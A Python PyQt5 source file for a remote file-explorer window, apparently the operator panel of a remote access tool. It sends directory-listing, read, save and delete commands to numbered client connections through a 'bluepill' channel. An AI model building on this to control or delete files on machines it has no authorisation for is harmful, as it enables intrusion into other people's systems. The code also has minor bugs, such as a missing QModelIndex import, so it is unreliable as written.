import sys
import json
from PyQt5.QtWidgets import QApplication, QSizePolicy, QMainWindow, QTreeView, QVBoxLayout, QWidget, QLineEdit, QMenu, QAction, QPushButton, QMessageBox, QDialog,QLabel, QTextEdit
from PyQt5.QtGui import QStandardItem, QStandardItemModel, QIcon
import base64
from PyQt5.QtGui import QPixmap, QIcon
from PyQt5.QtCore import Qt, QObject, pyqtSignal
import os

import time
class TextUpdater(QObject):
    update_signal = pyqtSignal(str)

    def __init__(self, text_edit):
        super().__init__()
        self.text_edit = text_edit

    def add_text(self, text, n=1000):
        for i in range(0, len(text), n):
            chunk = text[i:i + n]
            self.update_signal.emit(chunk)
            
class FileExplorerApp(QMainWindow):
    def __init__(self, window_name, parent=None):
        super().__init__()
        self.userid = window_name
        self.info = parent
        self.initUI()
        self.text_updater = TextUpdater(self.text_edit_window.centralWidget())
        self.text_updater.update_signal.connect(self.add_text)

    def initUI(self):
        self.setWindowTitle(f"File Explorer {self.userid}")
        self.setGeometry(100, 100, 800, 600)
        self.setStyleSheet("background-color: #333; color: #FFF;")
        self.central_widget = QWidget()
        self.setCentralWidget(self.central_widget)
        self.text_edit_window = self
        layout = QVBoxLayout(self.central_widget)

        # Add a QLineEdit (text box) above the QTreeView
        self.search_box = QLineEdit()
        layout.addWidget(self.search_box)

        # Create a container widget for the tree view and error button
        tree_container = QWidget()
        tree_layout = QVBoxLayout(tree_container)

        self.tree_view = QTreeView()
        tree_layout.addWidget(self.tree_view)

        layout.addWidget(tree_container)

        self.model = QStandardItemModel()
        self.model.setHorizontalHeaderLabels(["File", "Type"])
        self.tree_view.setModel(self.model)

        # Context menu for the QTreeView
        self.tree_view.setContextMenuPolicy(Qt.CustomContextMenu)
        self.tree_view.customContextMenuRequested.connect(self.show_context_menu)
        self.tree_view.doubleClicked.connect(self.on_tree_item_double_clicked)
        # Connect the returnPressed signal of the search_box
        self.search_box.returnPressed.connect(self.on_search_enter_pressed)
        self.filename = ""
        self.text_edit_content = ""

    def closeEvent(self, event):
        self.info.file_explorer[int(self.userid)-1] = ""

    def add_text(self, text):
        if self.text_edit_window is not None:
            text_edit = self.text_edit_window.centralWidget()
            text_edit.setUndoRedoEnabled(False)
            text_edit.insertPlainText(text)
            text_edit.setUndoRedoEnabled(True)

    def on_search_enter_pressed(self):
        search_text = self.search_box.text()
        print(f"Search Box Text: {search_text}")
        self.info.bluepill.send(b"dir->" + search_text.encode('utf-8'), self.info.connection[int(self.userid)-1])

    def on_tree_item_double_clicked(self, index):
        if index.isValid():
            item_name = index.sibling(index.row(), 0).data()
            item_type = self.model.itemFromIndex(index.sibling(index.row(), 1)).text()
            if item_type == "Folder":
                directory = os.path.join(self.value, item_name)
                print(directory)
                self.info.bluepill.send(b"dir->" + directory.encode('utf-8'), self.info.connection[int(self.userid)-1])
            else:
                print(f"Double-clicked on: {item_name}, Type: {item_type}")
                file_name = os.path.join(self.value, item_name)
                self.info.bluepill.send(b"ReadFile->" + file_name.encode('utf-8'), self.info.connection[int(self.userid)-1])
                self.filename = file_name
                self.open_new_window()

    def open_new_window(self, file_contents=""):
        self.file_name = self.filename.split("\\")[-1]
        self.text_edit_window = QMainWindow()
        self.text_edit_window.setWindowTitle(f"Edit File: {self.file_name}")
        self.text_edit_window.setGeometry(200, 200, 600, 400)

        self.text_edit = QTextEdit(self.text_edit_window)
        self.text_edit.setGeometry(20, 20, 560, 360)
        self.text_edit.setPlainText(file_contents)

        # Enable undo and redo functionality for the QTextEdit
        self.text_edit.setUndoRedoEnabled(True)

        # Set dark mode style for QTextEdit
        dark_mode_stylesheet = """
        QTextEdit {
            background-color: #1E1E1E;  /* Dark background color */
            color: #FFFFFF;             /* Light text color */
        }
        """

        self.text_edit.setStyleSheet(dark_mode_stylesheet)

        self.text_edit_window.setCentralWidget(self.text_edit)

        # Create a menu bar for the text edit window
        menu_bar = self.text_edit_window.menuBar()

        # Create a "File" menu
        file_menu = menu_bar.addMenu("File")

        # Add "Save" action to the "File" menu
        save_action = QAction("Save (Ctrl+S)", self.text_edit_window)
        save_action.setShortcut("Ctrl+S")  # Set the shortcut for Ctrl + S
        save_action.triggered.connect(self.save_file)  # Connect the action to the save_file method
        file_menu.addAction(save_action)

        edit_menu = menu_bar.addMenu("Edit")

        # Add "Add Text" action to the "Edit" menu
        add_text_action = QAction("Add Text", self.text_edit_window)
        add_text_action.triggered.connect(self.add_text)  # Connect the action to the add_text function
        edit_menu.addAction(add_text_action)  # Add the action to the "Edit" menu

        # Show the new top-level window
        self.text_edit_window.show()

    def save_file(self):
        if self.text_edit is not None:
            text = self.text_edit.toPlainText().encode('utf-8')
            hex_bytecode = "".join(f"{byte:02X}" for byte in text)
            data = self.filename + " " + hex_bytecode
            contents = {"filename": self.file_name, "contents": hex_bytecode}
            to_json = json.dumps(contents)
            self.info.bluepill.send(b"savefile->" + to_json.encode('utf-8'), self.info.connection[int(self.userid)-1])

    def show_error_popup(self, title, message):
        # Define message box parameters
        try:
            import ctypes
            if title == "File Explorer": style = ctypes.c_uint(0x10)
            else: style = ctypes.c_uint(0x30)
            # Show the error popup using Windows API
            ctypes.windll.user32.MessageBoxW(0, message, title, style)
        except:
            print("ERROR")
        
    def populate_tree_view(self, json_data):
        self.model.removeRows(0, self.model.rowCount())
        self.value = json_data[-1]['Extension'].replace('\\\\', '\\')
        self.search_box.setText(self.value)
        root_item = self.model.invisibleRootItem()
        for item_data in json_data:
            item_name = item_data.get("Name")
            item_type = item_data.get("Type")
            icon = item_data.get("IconBase64")
            if item_type == "Folder":
                self.create_folder(item_name, root_item, icon)
            elif item_type == "File":
                self.create_file(item_name, root_item, icon)
    def create_folder(self, name, parent, icon_base64):
        # Decode the base64 string into bytes
        icon_data = base64.b64decode(icon_base64)

        # Create a QPixmap from the decoded bytes
        folder_icon = QPixmap()
        folder_icon.loadFromData(icon_data)

        folder_item = [QStandardItem(name), QStandardItem("Folder")]
        folder_item[0].setIcon(QIcon(folder_icon))
        folder_item[0].setEditable(False)  # Make the item non-editable
        parent.appendRow(folder_item)

    def create_file(self, name, parent, icon_base64):
        icon_data = base64.b64decode(icon_base64)

        # Create a QPixmap from the decoded bytes
        folder_icon = QPixmap()
        folder_icon.loadFromData(icon_data)

        folder_item = [QStandardItem(name), QStandardItem("File")]
        folder_item[0].setIcon(QIcon(folder_icon))
        folder_item[0].setEditable(False)  # Make the item non-editable
        parent.appendRow(folder_item)

    def show_context_menu(self, pos):
        index = self.tree_view.indexAt(pos)
        if index.isValid():
            menu = QMenu(self)
            item_name = index.sibling(index.row(), 0).data()

            # Add actions to the context menu
            action = QAction(f"{item_name}", self)
            action.triggered.connect(self.on_action_clicked)
            
            download = QAction(f"Download", self)
            download.triggered.connect(self.on_download_clicked)
            
            delete = QAction(f"Delete", self)
            delete.triggered.connect(self.on_delete_clicked)
            
            rename = QAction(f"Rename", self)
            rename.triggered.connect(self.on_rename_clicked)
            
            menu.addAction(action)
            menu.addAction(download)
            menu.addAction(delete)
            menu.addAction(rename)
            menu.exec_(self.tree_view.viewport().mapToGlobal(pos))

    def on_action_clicked(self):
        sender = self.sender()
        if sender:
            item_name = sender.text()
            item_index = self.find_item_index(item_name)
            if item_index.isValid():
                item_type = self.model.itemFromIndex(item_index.sibling(item_index.row(), 1)).text()
                if item_type == "Folder":
                    directory = os.path.join(self.value, item_name)
                    print(directory)
                    self.info.bluepill.send(b"dir->" + directory.encode('utf-8'), self.info.connection[int(self.userid)-1])
                print(f"Clicked on: {item_name}, Type: {item_type}")


    def on_download_clicked(self):
        index = self.tree_view.selectionModel().currentIndex()
        if index.isValid():
            item_name = index.sibling(index.row(), 0).data()
            item_type = index.sibling(index.row(), 1).data()

            if item_type == "File":
                # If it's a file, you can download it
                file_name = item_name
                directory = os.path.join(self.value, file_name)
                print(f"Downloading file: {directory}")
                # Add your download logic here

    def on_delete_clicked(self):
        index = self.tree_view.selectionModel().currentIndex()
        if index.isValid():
            item_name = index.sibling(index.row(), 0).data()
            item_type = index.sibling(index.row(), 1).data()

            if item_type == "File":
                # If it's a file, you can download it
                file_name = item_name
                directory = os.path.join(self.value, file_name)
                print(f"Deleting file: {directory}")
                self.info.bluepill.send(b"delete->" + directory.encode('utf-8'), self.info.connection[int(self.userid)-1])
                self.info.bluepill.send(b"dir->" + self.value.encode('utf-8'), self.info.connection[int(self.userid)-1])

    def on_rename_clicked(self):
        print("Rename clicked")


    def find_item_index(self, item_name):
        root_item = self.model.invisibleRootItem()
        for row in range(root_item.rowCount()):
            index = root_item.child(row, 0).index()
            if index.data() == item_name:
                return index
        return QModelIndex()